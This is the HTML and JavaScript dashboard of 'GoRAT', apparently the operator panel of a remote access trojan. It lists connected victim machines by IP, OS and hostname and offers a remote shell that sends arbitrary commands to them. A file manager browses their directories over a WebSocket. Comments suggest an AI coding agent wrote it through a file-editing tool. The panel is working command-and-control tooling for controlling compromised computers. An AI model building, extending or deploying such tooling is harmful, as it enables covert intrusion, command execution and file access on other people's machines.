<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - GoRAT</title>
    <style>
        body { font-family: sans-serif; margin: 0; background-color: #f4f7f6; color: #333; }
        header { background-color: #333; color: white; padding: 1em; display: flex; justify-content: space-between; align-items: center; }
        header h1 { margin: 0; }
        header a { color: white; text-decoration: none; padding: 0.5em; }
        header a:hover { background-color: #555; }
        .container { padding: 2em; }
        table { width: 100%; border-collapse: collapse; margin-top: 1em; background-color: #fff; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        th, td { border: 1px solid #ddd; padding: 0.8em; text-align: left; }
        th { background-color: #e9ecef; }
        .status-connected { color: green; }
        .status-disconnected { color: red; }
        #no-clients-message { text-align: center; padding: 1em; color: #777; }
    </style>
</head>
<body>
    <header>
        <h1>GoRAT Dashboard</h1>
        <nav>
            <a href="/logout">Logout</a>
        </nav>
    </header>
    <div class="container">
        <h2>Connected Clients</h2>
        <table id="client-table">
            <thead>
                <tr>
                    <th>ID</th>
                    <th>Remote IP</th>
                    <th>OS</th>
                    <th>Hostname</th>
                    <th>Status</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody id="client-list">
                <!-- Client rows will be inserted here by JavaScript -->
            </tbody>
        </table>
        <div id="no-clients-message" style="display: none;">No clients connected.</div>
    </div>

    <!-- Remote Shell Modal -->
    <div id="shell-modal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background-color:rgba(0,0,0,0.5); z-index:1000; align-items:center; justify-content:center;">
        <div style="background-color:white; padding:20px; border-radius:8px; width:80%; max-width:700px; box-shadow:0 0 15px rgba(0,0,0,0.3); display:flex; flex-direction:column; max-height: 80vh;">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
                <h3 id="shell-modal-title">Remote Shell</h3>
                <button onclick="closeShellModal()" style="background:none; border:none; font-size:1.5em; cursor:pointer;">&times;</button>
            </div>
            <pre id="shell-output" style="background-color:#f0f0f0; border:1px solid #ddd; padding:10px; height:300px; overflow-y:scroll; white-space:pre-wrap; word-wrap:break-word; flex-grow:1;"></pre>
            <div style="display:flex; margin-top:10px;">
                <input type="text" id="shell-command-input" placeholder="Enter command..." style="flex-grow:1; padding:8px; border:1px solid #ddd; border-radius:4px 0 0 4px;">
                <button onclick="sendShellCommand()" style="padding:8px 15px; background-color:#007bff; color:white; border:none; border-radius:0 4px 4px 0; cursor:pointer;">Send</button>
            </div>
        </div>
    </div>

    <!-- File Manager Modal -->
    <div id="fm-modal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background-color:rgba(0,0,0,0.5); z-index:1010; align-items:center; justify-content:center;">
        <div style="background-color:white; padding:20px; border-radius:8px; width:90%; max-width:800px; box-shadow:0 0 15px rgba(0,0,0,0.3); display:flex; flex-direction:column; max-height: 90vh;">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
                <h3 id="fm-modal-title">File Manager</h3>
                <button onclick="closeFMModal()" style="background:none; border:none; font-size:1.5em; cursor:pointer;">&times;</button>
            </div>
            <div style="display:flex; margin-bottom:10px;">
                <input type="text" id="fm-path-input" placeholder="Current path..." style="flex-grow:1; padding:8px; border:1px solid #ddd; border-radius:4px 0 0 4px;">
                <button onclick="fmGoToPath()" style="padding:8px 15px; background-color:#17a2b8; color:white; border:none; border-radius:0 4px 4px 0; cursor:pointer;">Go</button>
            </div>
            <div id="fm-error-display" style="color:red; margin-bottom:10px; display:none;"></div>
            <div style="overflow-y:auto; flex-grow:1; border:1px solid #ddd;">
                <table style="width:100%; border-collapse:collapse;">
                    <thead>
                        <tr>
                            <th style="text-align:left; padding:8px; border-bottom:1px solid #ccc;">Name</th>
                            <th style="text-align:left; padding:8px; border-bottom:1px solid #ccc;">Type</th>
                            <th style="text-align:right; padding:8px; border-bottom:1px solid #ccc;">Size</th>
                            <th style="text-align:left; padding:8px; border-bottom:1px solid #ccc;">Modified</th>
                        </tr>
                    </thead>
                    <tbody id="fm-file-list">
                        <!-- File entries will be populated here -->
                    </tbody>
                </table>
            </div>
        </div>
    </div>

    <script>
        const clientListBody = document.getElementById('client-list');
        const noClientsMessage = document.getElementById('no-clients-message');
        let wsAdmin;

        function connectAdminWebSocket() {
            // Construct WebSocket URL, ensuring it uses wss for secure connections
            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            const host = window.location.host;
            wsAdmin = new WebSocket(`${protocol}//${host}/ws_admin`);

            wsAdmin.onopen = () => {
                console.log("Admin WebSocket connection established.");
            };

            wsAdmin.onmessage = (event) => {
                console.log("Received message from admin WebSocket:", event.data);
                try {
                    const update = JSON.parse(event.data);
                    if (update.type === 'client_update') {
                        updateClientTable(update.payload);
                    } else if (update.type === 'client_list') {
                         updateClientTable(update.payload); // Initial full list
                    }
                } catch (e) {
                    console.error("Error processing message from admin WebSocket:", e);
                }
            };

            wsAdmin.onclose = () => {
                console.log("Admin WebSocket connection closed. Attempting to reconnect...");
                // Simple reconnect strategy
                setTimeout(connectAdminWebSocket, 5000);
            };

            wsAdmin.onerror = (error) => {
                console.error("Admin WebSocket error:", error);
                // wsAdmin.close(); // This will trigger the onclose handler for reconnection
            };
        }
        
        function updateClientTable(clients) {
            // Clear existing rows
            clientListBody.innerHTML = '';

            if (!clients || clients.length === 0) {
                noClientsMessage.style.display = 'block';
                return;
            }
            noClientsMessage.style.display = 'none';

            clients.forEach(client => {
                const row = clientListBody.insertRow();
                row.insertCell().textContent = client.ID || 'N/A';
                row.insertCell().textContent = client.RemoteAddr || 'N/A';
                row.insertCell().textContent = client.OS || 'N/A';
                row.insertCell().textContent = client.Hostname || 'N/A';
                
                const statusCell = row.insertCell();
                statusCell.textContent = client.Status || 'N/A';
                statusCell.className = client.Status === 'Connected' ? 'status-connected' : 'status-disconnected';
                
                const actionsCell = row.insertCell();
                const shellButton = document.createElement('button');
                shellButton.textContent = 'Remote Shell';
                shellButton.onclick = () => openShellModal(client.ID, client.Hostname || client.RemoteAddr);
                actionsCell.appendChild(shellButton);

                const fmButton = document.createElement('button');
                fmButton.textContent = 'File Manager';
                fmButton.style.marginLeft = '5px';
                fmButton.onclick = () => openFMModal(client.ID, client.Hostname || client.RemoteAddr, "."); // Default to current dir
                actionsCell.appendChild(fmButton);
            });
        }

        // --- Remote Shell Modal Logic ---
        let currentShellClientId = null;
        const shellModal = document.getElementById('shell-modal');
        const shellModalTitle = document.getElementById('shell-modal-title');
        const shellOutputArea = document.getElementById('shell-output');
        const shellCommandInput = document.getElementById('shell-command-input');

        function openShellModal(clientId, clientIdentifier) {
            currentShellClientId = clientId; // Used by shell output handler
            currentFMClientId = null; // Ensure FM modal is not considered active for messages
            shellModalTitle.textContent = `Remote Shell - ${clientIdentifier} (${clientId})`;
            shellOutputArea.textContent = ''; 
            shellCommandInput.value = ''; 
            shellModal.style.display = 'flex';
            shellCommandInput.focus();
        }
        function closeShellModal() {
            shellModal.style.display = 'none';
            currentShellClientId = null;
        }
        function sendShellCommand() {
            if (!currentShellClientId || !wsAdmin || wsAdmin.readyState !== WebSocket.OPEN) {
                appendShellOutput("WebSocket not connected or no client selected.", "error"); return;
            }
            const command = shellCommandInput.value;
            if (command.trim() === "") return;
            wsAdmin.send(JSON.stringify({ type: "admin_shell_command", payload: { client_id: currentShellClientId, command: command } }));
            appendShellOutput(`> ${command}\n`, "command");
            shellCommandInput.value = '';
        }
        shellCommandInput.addEventListener('keypress', (event) => { if (event.key === 'Enter') sendShellCommand(); });
        function appendShellOutput(text, type = "output") {
            const line = document.createElement('div');
            if (type === "error") line.style.color = "red";
            else if (type === "command") line.style.color = "blue";
            line.textContent = text;
            shellOutputArea.appendChild(line);
            shellOutputArea.scrollTop = shellOutputArea.scrollHeight;
        }

        // --- File Manager Modal Logic ---
        let currentFMClientId = null;
        let currentFMPath = ".";
        const fmModal = document.getElementById('fm-modal');
        const fmModalTitle = document.getElementById('fm-modal-title');
        const fmPathInput = document.getElementById('fm-path-input');
        const fmFileListBody = document.getElementById('fm-file-list');
        const fmErrorDisplay = document.getElementById('fm-error-display');

        function openFMModal(clientId, clientIdentifier, path) {
            currentFMClientId = clientId; // Used by FM response handler
            currentShellClientId = null; // Ensure Shell modal is not considered active
            currentFMPath = path || ".";
            fmModalTitle.textContent = `File Manager - ${clientIdentifier} (${clientId})`;
            fmPathInput.value = currentFMPath;
            fmErrorDisplay.style.display = 'none';
            fmErrorDisplay.textContent = '';
            fmFileListBody.innerHTML = '<tr><td colspan="4" style="text-align:center; padding:10px;">Loading...</td></tr>'; // Clear previous list
            fmModal.style.display = 'flex';
            requestFMListDir(clientId, currentFMPath);
        }
        function closeFMModal() {
            fmModal.style.display = 'none';
            currentFMClientId = null;
        }
        function requestFMListDir(clientId, path) {
            if (!clientId || !wsAdmin || wsAdmin.readyState !== WebSocket.OPEN) {
                fmErrorDisplay.textContent = "WebSocket not connected or no client selected.";
                fmErrorDisplay.style.display = 'block';
                return;
            }
            currentFMPath = path; // Update current path
            fmPathInput.value = currentFMPath; // Reflect in input
            wsAdmin.send(JSON.stringify({ type: "admin_fm_list_dir", payload: { client_id: clientId, path: path } }));
        }
        function fmGoToPath() {
            const newPath = fmPathInput.value.trim();
            if (newPath === "" || !currentFMClientId) return;
            requestFMListDir(currentFMClientId, newPath);
        }
        fmPathInput.addEventListener('keypress', (event) => { if (event.key === 'Enter') fmGoToPath(); });

        function updateFMFileList(files, errorMsg) {
            fmFileListBody.innerHTML = ''; // Clear previous entries or "Loading..."
            fmErrorDisplay.style.display = 'none';
            fmErrorDisplay.textContent = '';

            if (errorMsg) {
                fmErrorDisplay.textContent = `Error: ${errorMsg}`;
                fmErrorDisplay.style.display = 'block';
            }

            if (!files || files.length === 0 && !errorMsg) {
                fmFileListBody.innerHTML = '<tr><td colspan="4" style="text-align:center; padding:10px;">Directory is empty or inaccessible.</td></tr>';
                return;
            }
            
            // Add ".." entry for navigation up, if not at root (simple check for ".")
            if (currentFMPath !== "." && currentFMPath !== "/" && currentFMPath !== "C:\\" /* more robust root checks needed */) {
                 const parentRow = fmFileListBody.insertRow();
                 const nameCell = parentRow.insertCell();
                 nameCell.innerHTML = `<a href="#" onclick="fmNavigateToParentDir(event)">.. (Parent Directory)</a>`;
                 nameCell.colSpan = 4; // Span across all columns
            }


            files.sort((a, b) => { // Sort: dirs first, then by name
                if (a.is_dir !== b.is_dir) return a.is_dir ? -1 : 1;
                return a.name.localeCompare(b.name);
            });

            files.forEach(file => {
                const row = fmFileListBody.insertRow();
                const nameCell = row.insertCell();
                if (file.is_dir) {
                    nameCell.innerHTML = `<a href="#" onclick="fmNavigateToDir(event, '${file.name}')">${file.name}</a>`;
                } else {
                    nameCell.textContent = file.name;
                }
                nameCell.style.padding = "8px";

                row.insertCell().textContent = file.is_dir ? 'Directory' : 'File';
                row.cells[1].style.padding = "8px";

                const sizeCell = row.insertCell();
                sizeCell.textContent = file.is_dir ? '-' : formatFileSize(file.size);
                sizeCell.style.textAlign = "right";
                sizeCell.style.padding = "8px";
                
                const modTimeCell = row.insertCell();
                modTimeCell.textContent = new Date(file.mod_time).toLocaleString();
                modTimeCell.style.padding = "8px";
            });
        }
        function fmNavigateToDir(event, dirName) {
            event.preventDefault();
            if (!currentFMClientId) return;
            // Simple path joining, might need improvement for robustness (e.g. handling double slashes)
            let newPath = currentFMPath;
            if (newPath === "." || newPath === "") newPath = dirName;
            else if (newPath.endsWith("/") || newPath.endsWith("\\")) newPath += dirName;
            else newPath += (currentFMPath.includes("\\") ? "\\" : "/") + dirName; // Guess separator
            requestFMListDir(currentFMClientId, newPath);
        }
        function fmNavigateToParentDir(event) {
            event.preventDefault();
            if (!currentFMClientId || currentFMPath === "." || currentFMPath === "" ) return;
            // Simple parent dir logic, might need improvement
            let lastSepUnix = currentFMPath.lastIndexOf('/');
            let lastSepWin = currentFMPath.lastIndexOf('\\');
            let lastSep = Math.max(lastSepUnix, lastSepWin);
            
            let newPath = "."; // Default to current dir if parent is root or unresolvable
            if (lastSep > 0) { // if sep is not the first char (e.g. /foo, not /)
                newPath = currentFMPath.substring(0, lastSep);
            } else if (lastSep === 0 && currentFMPath.length > 1) { // Root like / or C:\
                 newPath = currentFMPath.substring(0, 1); // e.g. "/" or "C" (stub needs to handle "C" as "C:\")
                 if (currentFMPath.match(/^[a-zA-Z]:\\$/) && currentFMPath.length === 3) { // C:\
                    newPath = "."; // Cannot go further up from C:\ via this simple logic
                 } else if (currentFMPath.startsWith("/") && currentFMPath.length > 1) { // /foo -> /
                    newPath = "/";
                 }
            }
            requestFMListDir(currentFMClientId, newPath);
        }
        function formatFileSize(bytes) {
            if (bytes === 0) return '0 B';
            const k = 1024;
            const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        }

        // Initial connection logic (will be replaced by connectAdminWebSocket_extended)
        // connectAdminWebSocket(); 

        // Modify the onmessage handler in connectAdminWebSocket to handle shell_output_from_stub
        // This requires changing the existing connectAdminWebSocket function.
        // The original onmessage was:
        // wsAdmin.onmessage = (event) => {
        //     console.log("Received message from admin WebSocket:", event.data);
        //     try {
        //         const update = JSON.parse(event.data);
        //         if (update.type === 'client_update') {
        //             updateClientTable(update.payload);
        //         } else if (update.type === 'client_list') {
        //              updateClientTable(update.payload); // Initial full list
        //         }
        //     } catch (e) {
        //         console.error("Error processing message from admin WebSocket:", e);
        //     }
        // };
        // It will be redefined below as part of this script block.

    </script>
    <script>
        // Redefine/Extend connectAdminWebSocket to handle new message types
        // This is a common pattern if the original script is complex or loaded first. 
        // For this tool, it's easier to just assume we are writing the full script block.
        // The previous script block for this file will be replaced.
        // So, I will redefine wsAdmin.onmessage within the connectAdminWebSocket function.
        
        // const clientListBody = document.getElementById('client-list'); // Already defined
        // const noClientsMessage = document.getElementById('no-clients-message'); // Already defined
        // let wsAdmin; // Already defined

        function connectAdminWebSocket_extended() { // Renaming to avoid conflict if tool merges blocks
            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            const host = window.location.host;
            wsAdmin = new WebSocket(`${protocol}//${host}/ws_admin`);

            wsAdmin.onopen = () => {
                console.log("Admin WebSocket connection established.");
                 // Request initial client list upon connection, or server can send it automatically.
                 // For now, server sends client_list automatically on admin connect (see client_manager.go).
            };

            wsAdmin.onmessage = (event) => {
                console.log("Received message from admin WebSocket:", event.data);
                try {
                    const message = JSON.parse(event.data);
                    switch (message.type) {
                        case 'client_list': 
                            updateClientTable(message.payload);
                            break;
                        case 'shell_output_from_stub':
                            if (message.payload.client_id === currentShellClientId) {
                                let outputText = "";
                                if (message.payload.output) outputText += message.payload.output;
                                if (message.payload.error) outputText += (outputText ? "\n" : "") + "Error: " + message.payload.error;
                                appendShellOutput(outputText, message.payload.error ? "error" : "output");
                            }
                            break;
                        case 'fm_list_dir_response_from_stub':
                            if (message.payload.client_id === currentFMClientId) {
                                updateFMFileList(message.payload.files, message.payload.error);
                            }
                            break;
                        default:
                            console.log("Unknown message type from server:", message.type);
                    }
                } catch (e) {
                    console.error("Error processing message from admin WebSocket:", e);
                }
            };

            wsAdmin.onclose = () => {
                console.log("Admin WebSocket connection closed. Attempting to reconnect...");
                setTimeout(connectAdminWebSocket_extended, 5000); 
            };

            wsAdmin.onerror = (error) => {
                console.error("Admin WebSocket error:", error);
            };
        }
        
        connectAdminWebSocket_extended(); 

    </script>
</body>
</html>
